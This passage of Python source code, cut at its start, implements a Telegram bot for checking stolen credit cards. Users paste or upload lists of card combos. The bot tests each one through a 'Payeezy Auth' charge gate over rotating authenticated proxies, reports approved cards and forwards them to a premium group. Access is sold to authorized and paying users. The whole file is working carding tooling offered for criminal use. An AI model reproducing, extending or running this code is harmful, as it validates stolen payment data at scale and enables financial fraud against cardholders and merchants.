        "https://": f"http://{proxy_user}:{proxy_password}@{proxy_ip}:{proxy_port}",
        "http://": f"http://{proxy_user}:{proxy_password}@{proxy_ip}:{proxy_port}",
    }
    async with httpx.AsyncClient(timeout=40, proxies=proxies) as session:
        result = await create_cvv_charge(x, session)
    end = time.time()
    resp = f"{x} - {result} - Taken {round(end - start, 2)}s"
    bot.edit_message_text(resp, chat_id, message_id)
    return result

def create_inline_keyboard(approved, declined, total, current_cc, total_ccs):
    keyboard = types.InlineKeyboardMarkup()
    keyboard.row(
        types.InlineKeyboardButton(f"Approved ✅ : {approved}", callback_data="approved"),
    )
    keyboard.row(
        types.InlineKeyboardButton(f"Declined ❌ : {declined}", callback_data="declined"),
    )
    keyboard.row(
        types.InlineKeyboardButton(f"Total 🚫 : {total}", callback_data="total"),
    )
    keyboard.row(
        types.InlineKeyboardButton(f"Total CCs in File 🚫 : {total_ccs}", callback_data="total_ccs"),
    )
    return keyboard

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if message.from_user.id in AUTHORIZED_USER_IDS or message.from_user.id in premium_users:
        welcome_message = """
👋 **Welcome to CC Checker Bot!** 👋

📜 **How to Use:**
1. **Send `/check <combo>`** - Start checking a CC combo.
2. **Upload a .txt file** - Upload a text file with CC combos to start checking.
3. **/cmd or /cmds** - More Commands Info

💡 *Note:* Only authorized users can access the bot. Contact @trexhq for authorization.

🔒 **Stay secure and happy checking!** 🔒
        """
        bot.reply_to(message, welcome_message, parse_mode="Markdown")
    else:
        unauthorized_message = """
🚫 **Access Denied** 🚫

You are not authorized to use this bot. Please contact @trexhq for authorization.
        """
        bot.reply_to(message, unauthorized_message, parse_mode="Markdown")
@bot.message_handler(commands=['cmd', 'cmds'])
def send_commands(message):
    commands_text = """
📋*Command List for CC Checker Bot*📋

🔹 */start* or */help* - Get a welcome message and help info.
🔹 */check <combo>* - Start checking a CC combo.
🔹 */stop* - Stop the current checking process.
🔹 */pause* - Pause the current checking process.
🔹 */resume* - Resume the paused checking process.
🔹 *Upload a .txt file* - Upload a text file with CC combos to start checking.

💡 *Note:* Only authorized users can access the bot. Contact @trexhq for authorization.
    """
    
    bot.send_message(message.chat.id, commands_text, parse_mode="Markdown")


@bot.message_handler(commands=['check'])
def check_cc(message):
    Thread(target=asyncio.run, args=(_check_cc(message),)).start()

async def _check_cc(message):
    global user_tasks
    if message.from_user.id in AUTHORIZED_USER_IDS or message.from_user.id in premium_users:
        if message.from_user.id in user_tasks and user_tasks[message.from_user.id]['is_running']:
            check_running_message = """
            ⏳ **Check in Progress** ⏳

            A check is already running. Please wait for it to finish or stop it using **/stop**.
            """

            bot.reply_to(message, check_running_message, parse_mode="Markdown")
            return
        try:
            combo = message.text.split('/check ')[1]
            ccs = combo.split('\n')
            user_tasks[message.from_user.id] = {
                'is_running': True,
                'is_paused': False,
                'queue': deque(ccs),
                'approved': [],
                'declined': [],
                'total': 0
            }
            start_check_message = """
            🔄 **Starting CC Check...** 🔄
            """

            msg = bot.reply_to(message, start_check_message, parse_mode="Markdown")


            total_ccs = len(ccs)
            while user_tasks[message.from_user.id]['queue']:
                while user_tasks[message.from_user.id]['is_paused']:
                    await asyncio.sleep(1)
                if not user_tasks[message.from_user.id]['is_running']:
                    break
                current_cc = user_tasks[message.from_user.id]['queue'].popleft()
                user_tasks[message.from_user.id]['total'] += 1
                keyboard = create_inline_keyboard(
                    len(user_tasks[message.from_user.id]['approved']),
                    len(user_tasks[message.from_user.id]['declined']),
                    user_tasks[message.from_user.id]['total'],
                    current_cc,
                    total_ccs
                )
                edit_check_message = f"""
🔍 **Checking:** `{current_cc}`
🚪 **Gate:** **Payeezy Auth**
👨‍💻 **Developer:** **@trexhq**
                """

                bot.edit_message_text(edit_check_message, message.chat.id, msg.message_id, reply_markup=keyboard, parse_mode="Markdown")

                result = await multi_checking(current_cc, message.chat.id, msg.message_id)
                if 'Approved' in result:
                    user_tasks[message.from_user.id]['approved'].append(current_cc)
                    bot.send_message(
    message.chat.id, 
    f"""
💳 **𝗖𝗖:** `{current_cc}`
🛠 **𝗚𝗮𝘁𝗲:** **Payeezy Auth**
📝 **𝗗𝗲𝘁𝗮𝗶𝗹𝘀:** {result}
👨‍💻 **𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿:** @trexhq
    """,
    parse_mode="Markdown"
)

                    bot.send_message(
    PREMIUM_GROUP_ID, 
    f"""
💳 **𝗖𝗖:** `{current_cc}`
🛠 **𝗚𝗮𝘁𝗲:** **Payeezy Auth**
📝 **𝗗𝗲𝘁𝗮𝗶𝗹𝘀:** {result}
👨‍💻 **𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿:** @trexhq
    """,
    parse_mode="Markdown"
)

                else:
                    user_tasks[message.from_user.id]['declined'].append(current_cc)
                status_msg = f"Total: {user_tasks[message.from_user.id]['total']}\nApproved: {len(user_tasks[message.from_user.id]['approved'])}\nDeclined: {len(user_tasks[message.from_user.id]['declined'])}"
                bot.edit_message_text(status_msg, message.chat.id, msg.message_id, reply_markup=keyboard)
            check_completed_message = f"""
            ✅ **Check Completed!** ✅

            **Approved:**
            {user_tasks[message.from_user.id]['approved']}
            """

            bot.reply_to(message, check_completed_message, parse_mode="Markdown")

        except Exception as e:
            bot.reply_to(message, f"Error: {str(e)}")
        finally:
            user_tasks[message.from_user.id]['is_running'] = False
    else:
        unauthorized_message = """
🚫 **Access Denied** 🚫

You are not authorized to use this bot. Please contact **@trexhq** for authorization.
"""

        bot.reply_to(message, unauthorized_message, parse_mode="Markdown")

@bot.message_handler(commands=['stop'])
def stop_checking(message):
    global user_tasks
    if message.from_user.id in AUTHORIZED_USER_IDS or message.from_user.id in premium_users:
        if message.from_user.id in user_tasks and user_tasks[message.from_user.id]['is_running']:
            user_tasks[message.from_user.id]['is_running'] = False
            stop_check_message = """
            🛑 **Stopping the Current Checking Process** 🛑
            """

            bot.reply_to(message, stop_check_message, parse_mode="Markdown")

        else:
            no_check_process_message = """
            🚫 **No Checking Process Running** 🚫
            """

            bot.reply_to(message, no_check_process_message, parse_mode="Markdown")

    else:
        unauthorized_message = """
🚫 **Access Denied** 🚫

You are not authorized to use this bot. Please contact **@trexhq** for authorization.
"""

        bot.reply_to(message, unauthorized_message, parse_mode="Markdown")

@bot.message_handler(commands=['pause'])
def pause_checking(message):
    global user_tasks
    if message.from_user.id in AUTHORIZED_USER_IDS or message.from_user.id in premium_users:
        if message.from_user.id in user_tasks and user_tasks[message.from_user.id]['is_running']:
            user_tasks[message.from_user.id]['is_paused'] = True
            pause_check_message = """
            ⏸️ **Pausing the Current Checking Process** ⏸️
            """

            bot.reply_to(message, pause_check_message, parse_mode="Markdown")

        else:
            no_checking_process_message = """
            🚫 **No Checking Process Running** 🚫
            """

            bot.reply_to(message, no_checking_process_message, parse_mode="Markdown")

    else:
        unauthorized_message = """
🚫 **Access Denied** 🚫

You are not authorized to use this bot. Please contact **@trexhq** for authorization.
"""

        bot.reply_to(message, unauthorized_message, parse_mode="Markdown")

@bot.message_handler(commands=['resume'])
def resume_checking(message):
    global user_tasks
    if message.from_user.id in AUTHORIZED_USER_IDS or message.from_user.id in premium_users:
        if message.from_user.id in user_tasks and user_tasks[message.from_user.id]['is_running']:
            user_tasks[message.from_user.id]['is_paused'] = False
            resume_check_message = """
            ▶️ **Resuming the Current Checking Process** ▶️
            """

            bot.reply_to(message, resume_check_message, parse_mode="Markdown")

        else:
            no_checking_process_message = """
            🚫 **No Checking Process Running** 🚫
            """

            bot.reply_to(message, no_checking_process_message, parse_mode="Markdown")

    else:
        unauthorized_message = """
🚫 **Access Denied** 🚫

You are not authorized to use this bot. Please contact **@trexhq** for authorization.
"""

        bot.reply_to(message, unauthorized_message, parse_mode="Markdown")

@bot.message_handler(commands=['premium'])
def add_premium_user(message):
    if message.from_user.id == OWNER_ID:
        try:
            _, user_id, days = message.text.split()
            user_id = int(user_id)
            days = int(days)
            expiry_date = datetime.now() + timedelta(days=days)
            premium_users[user_id] = expiry_date
            save_premium_users(premium_users)
            premium_user_added_message = f"""
            🌟 **Premium User Added** 🌟

            User **{user_id}** has been added as a premium user for **{days} days**.
            """

            bot.reply_to(message, premium_user_added_message, parse_mode="Markdown")

            premium_access_message = f"""
            🌟 **Premium Access Granted** 🌟

            You have been granted premium access for **{days} days**.
            """

            bot.send_message(user_id, premium_access_message, parse_mode="Markdown")

        except Exception as e:
            bot.reply_to(message, f"Error: {str(e)}")
    else:
        unauthorized_message = """
🚫 **Access Denied** 🚫

You are not authorized to use this bot. Please contact **@trexhq** for authorization.
"""

        bot.reply_to(message, unauthorized_message, parse_mode="Markdown")


@bot.message_handler(content_types=['document'])
def handle_docs(message):
    Thread(target=asyncio.run, args=(_handle_docs(message),)).start()

async def _handle_docs(message):
    global user_tasks
    if message.from_user.id in AUTHORIZED_USER_IDS or message.from_user.id in premium_users:
        if message.from_user.id in user_tasks and user_tasks[message.from_user.id]['is_running']:
            check_running_message = """
            ⏳ **Check Already Running** ⏳

            A check is already running. Please wait for it to finish or stop it using **/stop**.
            """

            bot.reply_to(message, check_running_message, parse_mode="Markdown")

            return
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)

            with open(f"{message.document.file_name}", 'wb') as new_file:
                new_file.write(downloaded_file)

            with open(f"{message.document.file_name}", 'r', encoding='utf-8') as file:
                ccs = file.read().splitlines()

            user_tasks[message.from_user.id] = {
                'is_running': True,
                'is_paused': False,
                'queue': deque(ccs),
                'approved': [],
                'declined': [],
                'total': 0
            }
            start_check_message = """
            🔄 **Starting CC Check...** 🔄
            """

            msg = bot.reply_to(message, start_check_message, parse_mode="Markdown")

            total_ccs = len(ccs)
            while user_tasks[message.from_user.id]['queue']:
                while user_tasks[message.from_user.id]['is_paused']:
                    await asyncio.sleep(1)
                if not user_tasks[message.from_user.id]['is_running']:
                    break
                current_cc = user_tasks[message.from_user.id]['queue'].popleft()
                user_tasks[message.from_user.id]['total'] += 1
                keyboard = create_inline_keyboard(
                    len(user_tasks[message.from_user.id]['approved']),
                    len(user_tasks[message.from_user.id]['declined']),
                    user_tasks[message.from_user.id]['total'],
                    current_cc,
                    total_ccs
                )
                edit_check_message = f"""
🔍 **Checking:** `{current_cc}`
🚪 **Gate:** **Payeezy Auth**
👨‍💻 **Developer:** **@trexhq**
                """

                bot.edit_message_text(edit_check_message, message.chat.id, msg.message_id, reply_markup=keyboard, parse_mode="Markdown")

                result = await multi_checking(current_cc, message.chat.id, msg.message_id)
                if 'Approved' in result:
                    user_tasks[message.from_user.id]['approved'].append(current_cc)
                    bot.send_message(
    message.chat.id, 
    f"""
💳 **𝗖𝗖:** `{current_cc}`
🛠 **𝗚𝗮𝘁𝗲:** **Payeezy Auth**
📝 **𝗗𝗲𝘁𝗮𝗶𝗹𝘀:** {result}
👨‍💻 **𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿:** @trexhq
    """,
    parse_mode="Markdown"
)

                    bot.send_message(
    PREMIUM_GROUP_ID, 
    f"""
💳 **𝗖𝗖:** `{current_cc}`
🛠 **𝗚𝗮𝘁𝗲:** **Payeezy Auth**
📝 **𝗗𝗲𝘁𝗮𝗶𝗹𝘀:** {result}
👨‍💻 **𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿:** @trexhq
    """,
    parse_mode="Markdown"
)

                else:
                    user_tasks[message.from_user.id]['declined'].append(current_cc)
                status_msg = f"Approved: {len(user_tasks[message.from_user.id]['approved'])}\nDeclined: {len(user_tasks[message.from_user.id]['declined'])}\nTotal: {user_tasks[message.from_user.id]['total']}"
                bot.edit_message_text(status_msg, message.chat.id, msg.message_id, reply_markup=keyboard)
            check_completed_message = f"""
            ✅ **Check Completed!** ✅

            **Approved:**
            {user_tasks[message.from_user.id]['approved']}
            """

            bot.reply_to(message, check_completed_message, parse_mode="Markdown")


        except Exception as e:
            bot.reply_to(message, f"Error: {str(e)}")
        finally:
            user_tasks[message.from_user.id]['is_running'] = False
    else:
        unauthorized_message = """
🚫 **Access Denied** 🚫

You are not authorized to use this bot. Please contact **@trexhq** for authorization.
"""

        bot.reply_to(message, unauthorized_message, parse_mode="Markdown")


bot.infinity_polling()
